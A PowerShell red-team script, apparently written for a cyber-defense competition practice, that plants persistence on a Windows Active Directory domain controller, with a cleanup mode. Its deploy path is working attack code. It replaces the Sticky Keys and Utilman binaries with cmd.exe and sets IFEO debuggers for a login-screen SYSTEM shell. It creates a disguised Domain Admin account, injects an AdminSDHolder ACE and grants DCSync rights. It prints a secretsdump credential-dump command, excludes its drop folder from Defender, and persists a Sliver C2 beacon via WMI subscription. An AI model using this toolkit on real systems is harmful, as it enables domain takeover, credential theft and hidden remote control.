#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Nov 21 2026 -- Windows Server 2022 AD Persistence
# Target: 172.20.240.100 (AD/DNS)
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# New angles vs all prior practices:
#
#   Phase A -- Sticky Keys / Utilman Backdoor: replaces sethc.exe and
#              utilman.exe with cmd.exe copies. At the Windows login screen,
#              pressing Shift 5x or Win+U pops a SYSTEM cmd prompt -- no
#              credentials required. Never used in any prior CCDC practice.
#
#   Phase B -- Hidden Domain Admin Backdoor: creates a domain user with a
#              service-account-looking name (svc_spooler[hex]), added to
#              Domain Admins. All prior practices only made LOCAL accounts.
#
#   Phase C -- AdminSDHolder ACE Injection: adds the backdoor user to the
#              AdminSDHolder object's ACL with GenericAll. The SDProp process
#              (runs every ~60 min by default) propagates this ACE to all
#              AD-protected groups (Domain Admins, Schema Admins, etc.) and
#              their members. Blue team's password change or group removal
#              does NOT remove AdminSDHolder-sourced ACEs. Never done before.
#
#   Phase D -- DCSync Rights: grants DS-Replication-Get-Changes and
#              DS-Replication-Get-Changes-All on the domain NC root to the
#              backdoor user. Allows offline full credential dump from Kali
#              with impacket-secretsdump without touching LSASS. Never done.
#
#   Phase E -- Sliver C2 Beacon: downloads a Windows HTTP beacon from the
#              red team C2 server (172.31.40.6:8981/win_beacon.exe) and
#              persists it via WMI permanent event subscription (every 20 min,
#              VBScript consumer fires inside WmiPrvSE.exe -- same method as
#              ClusterShells 09-03 but with new names/GUIDs/paths, targeted
#              at the AD box for the first time in any practice).
#
# Usage:
#   .\03_persist_ad.ps1 deploy
#   .\03_persist_ad.ps1 cleanup
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

param([Parameter(Position=0)][string]$Mode = "deploy")

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

$StateDir   = "C:\Windows\System32\spool\drivers\color"
$StateFile  = "$StateDir\.rt21-ad-persist.json"
$DropDir    = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\cache"
$BeaconExe  = "$DropDir\WerFaultHandler.exe"
$WmiNS      = "root\subscription"
$WmiTimerNS = "root\cimv2"
$TimerName  = "DiagPlatSvc_HB20"
$FilterName = "DiagPlatSvcFilter"
$ConsumerName = "DiagPlatSvcConsumer"

Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
Write-Host "   Nov 21 2026 -- AD Persistence"                          -ForegroundColor Yellow
Write-Host "   StickyKeys | DA Backdoor | AdminSDHolder | DCSync | C2" -ForegroundColor Yellow
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed
Write-Host ""

switch ($Mode.ToLower()) {

# =============================================================================
# DEPLOY
# =============================================================================
"deploy" {

    New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    New-Item -Path $DropDir  -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $di = Get-Item $DropDir -Force -ErrorAction SilentlyContinue
    if ($di) { $di.Attributes = $di.Attributes -bor [System.IO.FileAttributes]::Hidden }

    $state = @{
        deployed_at           = (Get-Date -Format "o")
        accessibility_backups = @()
        backdoor_domain_user  = $null
        backdoor_domain_pass  = $null
        adminsdholder_ace     = $false
        dcsync_rights         = $false
        wmi_timer_name        = $TimerName
        wmi_filter_name       = $FilterName
        wmi_consumer_name     = $ConsumerName
    }

    # -------------------------------------------------------------------------
    # PHASE A: STICKY KEYS / UTILMAN BACKDOOR
    # sethc.exe  -> Shift x5 at login screen -> SYSTEM cmd
    # utilman.exe -> Win+U at login screen   -> SYSTEM cmd
    # Belt-and-suspenders: also set IFEO debugger so the backdoor survives
    # even if blue team restores the original binary from SFC.
    # -------------------------------------------------------------------------
    Write-Section "A / Sticky Keys + Utilman Backdoor"

    $targets = @(
        "$env:SystemRoot\System32\sethc.exe",
        "$env:SystemRoot\System32\utilman.exe"
    )

    foreach ($tgt in $targets) {
        if (-not (Test-Path $tgt)) { Write-Warn "Not found (skip): $tgt"; continue }

        $bkPath = "$StateDir\.bk_$(Split-Path $tgt -Leaf)"
        try {
            & takeown.exe /F $tgt /A 2>$null | Out-Null
            & icacls.exe  $tgt /grant "BUILTIN\Administrators:(F)" /C /Q 2>$null | Out-Null
            Copy-Item $tgt $bkPath -Force -ErrorAction Stop
            Copy-Item "$env:SystemRoot\System32\cmd.exe" $tgt -Force -ErrorAction Stop
            $state["accessibility_backups"] += @{ Original = $tgt; Backup = $bkPath }
            Write-Success "$(Split-Path $tgt -Leaf) -> cmd.exe  (backup: $bkPath)"
        } catch { Write-Warn "Binary swap failed for $tgt : $_" }
    }

    # IFEO debugger intercept: fires even if blue team restores the original binary
    foreach ($bin in @("sethc.exe", "utilman.exe")) {
        $ifeoKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$bin"
        try {
            if (-not (Test-Path $ifeoKey)) { New-Item $ifeoKey -Force | Out-Null }
            Set-ItemProperty $ifeoKey -Name "Debugger" -Value "C:\Windows\System32\cmd.exe" -Force
            Write-Success "IFEO Debugger set: $bin -> cmd.exe"
        } catch { Write-Warn "IFEO failed for $bin : $_" }
    }

    # -------------------------------------------------------------------------
    # PHASE B: HIDDEN DOMAIN ADMIN BACKDOOR
    # SamAccountName: svc_spooler[6hex] -- looks like a print spooler svc acct.
    # Added to Domain Admins. PasswordNeverExpires so it stays valid.
    # -------------------------------------------------------------------------
    Write-Section "B / Hidden Domain Admin Backdoor"

    $adAvailable = $false
    try {
        Import-Module ActiveDirectory -ErrorAction Stop
        $adAvailable = $true
    } catch { Write-Err "ActiveDirectory module unavailable -- Phases B/C/D skipped: $_" }

    if ($adAvailable) {
        $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
        $buf = New-Object byte[] 3
        $rng.GetBytes($buf)
        $hexSuffix = ($buf | ForEach-Object { $_.ToString('x2') }) -join ''
        $bdUser    = "svc_spooler$hexSuffix"

        $pwChars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%^&*()"
        $pwBuf   = New-Object byte[] 20
        $rng.GetBytes($pwBuf)
        $bdPass = -join ($pwBuf | ForEach-Object { $pwChars[$_ % $pwChars.Length] })

        $state["backdoor_domain_user"] = $bdUser
        $state["backdoor_domain_pass"] = $bdPass

        try {
            $secPw = ConvertTo-SecureString $bdPass -AsPlainText -Force
            New-ADUser -SamAccountName $bdUser `
                       -Name $bdUser `
                       -Description "Print Spooler service account (do not disable)" `
                       -AccountPassword $secPw `
                       -Enabled $true `
                       -PasswordNeverExpires $true `
                       -CannotChangePassword $true `
                       -ErrorAction Stop
            Add-ADGroupMember -Identity "Domain Admins" -Members $bdUser -ErrorAction Stop
            Write-Success "Domain backdoor created: $bdUser  pw: $bdPass"
            Write-Success "Added to Domain Admins"
        } catch { Write-Warn "Domain user/group add failed: $_" }

        # -------------------------------------------------------------------------
        # PHASE C: ADMINSDHOLDER ACE INJECTION
        # AdminSDHolder (CN=AdminSDHolder,CN=System,<domain>) holds the ACL template
        # that SDProp copies to ALL protected AD objects every 60 min.
        # Protected objects include: Domain Admins, Schema Admins, Enterprise Admins,
        # Administrators (local on DC), krbtgt, and any member of those groups.
        # Adding GenericAll for our backdoor user here means SDProp permanently
        # re-grants full rights even after blue team removes the user from groups
        # or modifies individual object ACLs.
        # -------------------------------------------------------------------------
        Write-Section "C / AdminSDHolder ACE Injection"

        try {
            $domainObj  = Get-ADDomain -ErrorAction Stop
            $domainDN   = $domainObj.DistinguishedName
            $sdHolderDN = "CN=AdminSDHolder,CN=System,$domainDN"
            $bdUserObj  = Get-ADUser $bdUser -ErrorAction Stop
            $userSID    = New-Object System.Security.Principal.SecurityIdentifier($bdUserObj.SID)

            $sdAcl = Get-Acl "AD:$sdHolderDN" -ErrorAction Stop

            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $userSID,
                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                [System.Security.AccessControl.AccessControlType]::Allow,
                [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
            )
            $sdAcl.AddAccessRule($ace)
            Set-Acl "AD:$sdHolderDN" $sdAcl -ErrorAction Stop

            Write-Success "AdminSDHolder ACE: $bdUser granted GenericAll"
            Write-Info "   Path: AD:CN=AdminSDHolder,CN=System,$domainDN"
            Write-Info "   SDProp propagates every ~60 min to all protected AD objects"
            $state["adminsdholder_ace"] = $true
        } catch { Write-Warn "AdminSDHolder ACE injection failed: $_" }

        # -------------------------------------------------------------------------
        # PHASE D: DCSYNC RIGHTS
        # DS-Replication-Get-Changes  (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
        # DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
        # Granted on the domain NC root (not AdminSDHolder -- these are domain-level
        # extended rights). With both rights the backdoor user can run DCSync and
        # dump all NT hashes, Kerberos keys, and DPAPI backup key offline.
        # From Kali: impacket-secretsdump UNDERPRESSURE/<bdUser>:'<bdPass>'@172.20.240.100
        # -------------------------------------------------------------------------
        Write-Section "D / DCSync Rights"

        try {
            $domainDN   = (Get-ADDomain -ErrorAction Stop).DistinguishedName
            $bdUserObj  = Get-ADUser $bdUser -ErrorAction Stop
            $userSID    = New-Object System.Security.Principal.SecurityIdentifier($bdUserObj.SID)

            $domainAcl  = Get-Acl "AD:$domainDN" -ErrorAction Stop

            $replChanges    = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
            $replChangesAll = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"

            foreach ($rightGuid in @($replChanges, $replChangesAll)) {
                $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $userSID,
                    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $rightGuid,
                    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None,
                    [Guid]::Empty
                )
                $domainAcl.AddAccessRule($ace)
            }
            Set-Acl "AD:$domainDN" $domainAcl -ErrorAction Stop

            Write-Success "DCSync rights granted to $bdUser on $domainDN"
            Write-Info "   DS-Replication-Get-Changes          (1131f6aa-...)"
            Write-Info "   DS-Replication-Get-Changes-All      (1131f6ad-...)"
            Write-Info "   Dump from Kali: impacket-secretsdump UNDERPRESSURE/$bdUser`:'$bdPass'@172.20.240.100"
            $state["dcsync_rights"] = $true
        } catch { Write-Warn "DCSync rights grant failed: $_" }
    }

    # -------------------------------------------------------------------------
    # PHASE E: SLIVER C2 BEACON (WMI permanent subscription, every 20 min)
    # Copies win_beacon.exe from bin\ next to this script into the drop dir.
    # Persistence: WMI ActiveScriptEventConsumer + IntervalTimerInstruction (20 min).
    # Beacon runs as a child of WmiPrvSE.exe -- blends into normal WMI activity.
    # -------------------------------------------------------------------------
    Write-Section "E / Sliver C2 Beacon"

    # Copy beacon from local toolkit (bin\win_beacon.exe next to this script)
    $beaconOk = $false
    try {
        Add-MpPreference -ExclusionPath $DropDir -ErrorAction SilentlyContinue
        $localBeacon = Join-Path $PSScriptRoot "bin\win_beacon.exe"
        Copy-Item $localBeacon $BeaconExe -Force -ErrorAction Stop
        $bf = Get-Item $BeaconExe -Force
        $bf.Attributes = $bf.Attributes -bor [System.IO.FileAttributes]::Hidden
        $beaconOk = $true
        Write-Success "Beacon copied: $BeaconExe ($((Get-Item $BeaconExe).Length) bytes)"
    } catch {
        Write-Warn "Beacon copy failed: $_"
        Write-Warn "Expected: $PSScriptRoot\bin\win_beacon.exe"
    }

    if ($beaconOk) {
        # Clean up any previous WMI subscription with the same names
        Get-WmiObject -Namespace $WmiNS -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like "*$FilterName*" } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $WmiNS -Class __EventFilter -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $FilterName } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $WmiNS -Class ActiveScriptEventConsumer -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $ConsumerName } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $WmiTimerNS -Class __IntervalTimerInstruction -ErrorAction SilentlyContinue |
            Where-Object { $_.TimerId -eq $TimerName } | Remove-WmiObject -ErrorAction SilentlyContinue

        # 20-minute interval timer
        Set-WmiInstance -Namespace $WmiTimerNS -Class __IntervalTimerInstruction -Arguments @{
            TimerId               = $TimerName
            IntervalBetweenEvents = [UInt32]1200000   # 20 min in ms
        } -ErrorAction SilentlyContinue | Out-Null

        $wmiFilter = Set-WmiInstance -Namespace $WmiNS -Class __EventFilter -Arguments @{
            Name           = $FilterName
            EventNameSpace = $WmiTimerNS
            QueryLanguage  = "WQL"
            Query          = "SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"
        } -ErrorAction Stop

        # VBScript launches the EXE via WScript.Shell (window style 0 = fully hidden)
        $vbsLaunch = "Set oShell = CreateObject(""WScript.Shell"") : oShell.Run """"""$BeaconExe"""""", 0, False"
        $wmiConsumer = Set-WmiInstance -Namespace $WmiNS -Class ActiveScriptEventConsumer -Arguments @{
            Name            = $ConsumerName
            ScriptingEngine = "VBScript"
            ScriptText      = $vbsLaunch
            KillTimeout     = [UInt32]0
        } -ErrorAction Stop

        Set-WmiInstance -Namespace $WmiNS -Class __FilterToConsumerBinding -Arguments @{
            Filter   = $wmiFilter
            Consumer = $wmiConsumer
        } -ErrorAction Stop | Out-Null

        Write-Success "WMI subscription planted -- beacon fires every 20 min via WmiPrvSE.exe"
        Write-Success "   Timer   : $WmiTimerNS :: __IntervalTimerInstruction  TimerId=$TimerName"
        Write-Success "   Filter  : $WmiNS :: __EventFilter  Name=$FilterName"
        Write-Success "   Consumer: $WmiNS :: ActiveScriptEventConsumer  Name=$ConsumerName"
    }

    # Save state
    try {
        $state | ConvertTo-Json -Depth 5 | Set-Content -Path $StateFile -Encoding UTF8 -Force
        $sf = Get-Item $StateFile -Force -ErrorAction SilentlyContinue
        if ($sf) { $sf.Attributes = $sf.Attributes -bor [System.IO.FileAttributes]::Hidden }
        Write-Success "State saved: $StateFile"
    } catch { Write-Warn "State save failed: $_" }

    Write-Host ""
    Write-Host " -- Summary -------------------------------------------" -ForegroundColor Green
    Write-Host "   A: sethc.exe + utilman.exe -> cmd.exe + IFEO debugger" -ForegroundColor Gray
    Write-Host "      (SYSTEM shell at login screen, Shift x5 or Win+U)" -ForegroundColor Gray
    Write-Host "   B: Domain backdoor: $($state['backdoor_domain_user'])  pw: $($state['backdoor_domain_pass'])" -ForegroundColor Gray
    Write-Host "   C: AdminSDHolder GenericAll -> SDProp propagates every 60 min" -ForegroundColor Gray
    Write-Host "   D: DCSync rights -> impacket-secretsdump from Kali" -ForegroundColor Gray
    Write-Host "   E: Sliver beacon @ WmiPrvSE.exe every 20 min (WMI subscription)" -ForegroundColor Gray
    Write-Host " -------------------------------------------------------" -ForegroundColor Green
}

# =============================================================================
# CLEANUP
# =============================================================================
"cleanup" {

    $state = $null
    if (Test-Path $StateFile) {
        try { $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json
        } catch { Write-Warn "State parse failed -- blind cleanup" }
    } else { Write-Warn "State file not found -- blind cleanup" }

    Write-Section "A / Restore sethc.exe + utilman.exe + IFEO"
    if ($state -and $state.accessibility_backups) {
        foreach ($entry in $state.accessibility_backups) {
            try {
                & takeown.exe /F $entry.Original /A 2>$null | Out-Null
                & icacls.exe  $entry.Original /grant "BUILTIN\Administrators:(F)" /C /Q 2>$null | Out-Null
                Copy-Item $entry.Backup $entry.Original -Force -ErrorAction Stop
                Remove-Item $entry.Backup -Force -ErrorAction SilentlyContinue
                Write-Success "Restored: $($entry.Original)"
            } catch { Write-Warn "Restore failed for $($entry.Original): $_" }
        }
    }
    foreach ($bin in @("sethc.exe", "utilman.exe")) {
        $ifeoKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$bin"
        Remove-ItemProperty $ifeoKey -Name "Debugger" -Force -ErrorAction SilentlyContinue
        Write-Success "IFEO debugger removed: $bin"
    }

    # Phases C and D run BEFORE B (user deletion) -- we need the user object to
    # look up their SID so we can find and remove the ACEs on AdminSDHolder and
    # the domain NC root. Once Remove-ADUser fires the SID is gone from AD.

    Write-Section "C / Remove AdminSDHolder ACE"
    # Linux analogy: removing a sudoers entry that was added to /etc/sudoers.d/ --
    # it doesn't matter that the user is gone, the rule still grants access to
    # anyone who recreates the account with the same name.
    if ($state -and $state.backdoor_domain_user -and $state.adminsdholder_ace) {
        try {
            Import-Module ActiveDirectory -ErrorAction SilentlyContinue
            $domainDN   = (Get-ADDomain -ErrorAction Stop).DistinguishedName
            $sdHolderDN = "CN=AdminSDHolder,CN=System,$domainDN"
            $bdUserObj  = Get-ADUser $state.backdoor_domain_user -ErrorAction Stop
            $userSID    = New-Object System.Security.Principal.SecurityIdentifier($bdUserObj.SID)

            $sdAcl  = Get-Acl "AD:$sdHolderDN" -ErrorAction Stop
            $before = $sdAcl.Access.Count
            $sdAcl.Access |
                Where-Object {
                    try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $userSID }
                    catch { $false }
                } |
                ForEach-Object { $sdAcl.RemoveAccessRule($_) | Out-Null }
            Set-Acl "AD:$sdHolderDN" $sdAcl -ErrorAction Stop
            $removed = $before - (Get-Acl "AD:$sdHolderDN").Access.Count
            Write-Success "AdminSDHolder ACE removed ($removed entry/entries) for $($state.backdoor_domain_user)"
            Write-Info "   SDProp will no longer propagate this ACE (~60 min cycle)"
        } catch { Write-Warn "AdminSDHolder ACE removal failed: $_" }
    } else {
        Write-Info "AdminSDHolder ACE not flagged in state -- skipping"
    }

    Write-Section "D / Remove DCSync Rights"
    if ($state -and $state.backdoor_domain_user -and $state.dcsync_rights) {
        try {
            Import-Module ActiveDirectory -ErrorAction SilentlyContinue
            $domainDN  = (Get-ADDomain -ErrorAction Stop).DistinguishedName
            $bdUserObj = Get-ADUser $state.backdoor_domain_user -ErrorAction Stop
            $userSID   = New-Object System.Security.Principal.SecurityIdentifier($bdUserObj.SID)

            $replChanges    = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
            $replChangesAll = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"

            $domainAcl = Get-Acl "AD:$domainDN" -ErrorAction Stop
            $before    = $domainAcl.Access.Count
            $domainAcl.Access |
                Where-Object {
                    try {
                        $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $userSID -and
                        ($_.ObjectType -eq $replChanges -or $_.ObjectType -eq $replChangesAll)
                    } catch { $false }
                } |
                ForEach-Object { $domainAcl.RemoveAccessRule($_) | Out-Null }
            Set-Acl "AD:$domainDN" $domainAcl -ErrorAction Stop
            $removed = $before - (Get-Acl "AD:$domainDN").Access.Count
            Write-Success "DCSync ACEs removed ($removed entry/entries) from $domainDN"
        } catch { Write-Warn "DCSync ACE removal failed: $_" }
    } else {
        Write-Info "DCSync rights not flagged in state -- skipping"
    }

    Write-Section "B / Remove Domain Backdoor"
    if ($state -and $state.backdoor_domain_user) {
        try {
            Import-Module ActiveDirectory -ErrorAction SilentlyContinue
            Remove-ADUser $state.backdoor_domain_user -Confirm:$false -ErrorAction Stop
            Write-Success "Removed domain user: $($state.backdoor_domain_user)"
        } catch { Write-Warn "AD user removal failed: $_" }
    }

    Write-Section "E / Remove WMI Subscription + Beacon"
    Get-WmiObject -Namespace $WmiNS -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
        Where-Object { $_.Filter -like "*$FilterName*" } | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace $WmiNS -Class __EventFilter -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -eq $FilterName } | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace $WmiNS -Class ActiveScriptEventConsumer -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -eq $ConsumerName } | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace $WmiTimerNS -Class __IntervalTimerInstruction -ErrorAction SilentlyContinue |
        Where-Object { $_.TimerId -eq $TimerName } | Remove-WmiObject -ErrorAction SilentlyContinue
    Write-Success "WMI subscription removed"

    if (Test-Path $BeaconExe) { Remove-Item $BeaconExe -Force -ErrorAction SilentlyContinue }
    Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
    Write-Success "Cleanup complete"
}

default {
    Write-Err "Usage: .\03_persist_ad.ps1 [deploy|cleanup]"
    exit 1
}

}
